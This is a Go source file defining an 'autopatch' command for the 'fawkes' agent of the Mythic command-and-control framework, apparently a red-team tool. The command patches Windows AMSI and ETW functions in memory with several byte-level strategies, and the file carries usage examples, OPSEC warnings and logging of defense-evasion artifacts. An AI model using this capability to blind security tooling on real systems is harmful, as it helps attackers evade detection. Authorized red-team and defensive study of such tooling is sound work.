package agentfunctions

import (
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "autopatch",
		Description:         "Patch security hooks in memory. Pattern-based scanning validates targets before patching. Actions: scan (check patchability), patch-amsi, patch-etw, patch-all. Multiple strategies: xor-ret, ret, nop-ret, mov-ret.",
		HelpString:          "# Scan AMSI/ETW targets for patchability\nautopatch -action scan\n# Patch AMSI with default strategy (xor-ret)\nautopatch -action patch-amsi\n# Patch ETW with specific strategy\nautopatch -action patch-etw -strategy ret\n# Patch all known targets\nautopatch -action patch-all\n# Legacy: raw function patch\nautopatch -dll_name amsi -function_name AmsiScanBuffer -num_bytes 300",
		Version:             2,
		MitreAttackMappings: []string{"T1562.001"},
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"scan", "patch-amsi", "patch-etw", "patch-all"},
				DefaultValue:  "scan",
				Description:   "scan (check targets), patch-amsi (patch AmsiScanBuffer), patch-etw (patch EtwEventWrite), patch-all (patch all known targets)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, UIModalPosition: 1, GroupName: "Default"},
				},
			},
			{
				Name:          "strategy",
				CLIName:       "strategy",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"xor-ret", "ret", "nop-ret", "mov-ret"},
				DefaultValue:  "xor-ret",
				Description:   "Patch strategy: xor-ret (returns 0/S_OK, recommended), ret (immediate return), nop-ret (NOP+NOP+RET), mov-ret (returns 1/TRUE)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, UIModalPosition: 2, GroupName: "Default"},
				},
			},
			{
				Name:          "dll_name",
				CLIName:       "dll_name",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "DLL name for legacy mode (e.g., amsi, ntdll.dll)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, UIModalPosition: 3, GroupName: "Legacy"},
				},
			},
			{
				Name:          "function_name",
				CLIName:       "function_name",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Function name for legacy mode (e.g., AmsiScanBuffer, EtwEventWrite)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, UIModalPosition: 4, GroupName: "Legacy"},
				},
			},
			{
				Name:          "num_bytes",
				CLIName:       "num_bytes",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:  300,
				Description:   "Search range for legacy mode (bytes to scan for RET instruction)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, UIModalPosition: 5, GroupName: "Legacy"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			if err := args.LoadArgsFromJSONString(input); err != nil {
				args.SetManualArgs(input)
			}
			return nil
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			var msg string
			if action == "scan" {
				msg = "OPSEC WARNING: Scanning AMSI/ETW function memory for patchability (T1562.001). Pattern scan reads function prologues via ReadProcessMemory. Lower risk than patching but still detectable."
			} else {
				msg = "OPSEC WARNING: Patching security hooks in memory (T1562.001). Modifying AMSI/ETW trampolines is a well-known evasion technique. EDR products monitor for hook integrity violations and memory protection changes."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false, OpsecPreMessage: msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			if action == "scan" {
				createArtifact(processResponse.TaskData.Task.ID, "Security Discovery",
					"autopatch scan: security hook patchability assessed")
			} else if strings.Contains(responseText, "patched") || strings.Contains(responseText, "success") {
				createArtifact(processResponse.TaskData.Task.ID, "Defense Evasion",
					fmt.Sprintf("autopatch %s: security hooks patched successfully", action))
			}
			return response
		},
		TaskFunctionCreateTasking: func(task *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  task.Task.ID,
			}
			action, _ := task.Args.GetStringArg("action")
			strategy, _ := task.Args.GetStringArg("strategy")
			if action != "" {
				display := fmt.Sprintf("action: %s", action)
				if strategy != "" && action != "scan" {
					display += fmt.Sprintf(", strategy: %s", strategy)
				}
				response.DisplayParams = &display
			} else if displayParams, err := task.Args.GetFinalArgs(); err == nil {
				response.DisplayParams = &displayParams
			}
			if action != "scan" {
				createArtifact(task.Task.ID, "API Call", "VirtualProtect + WriteProcessMemory on security DLL function")
				logOperationEvent(task.Task.ID,
					fmt.Sprintf("[DEFENSE EVASION] autopatch %s: patching security hooks on %s", action, task.Callback.Host), true)
			}
			return response
		},
	})
}
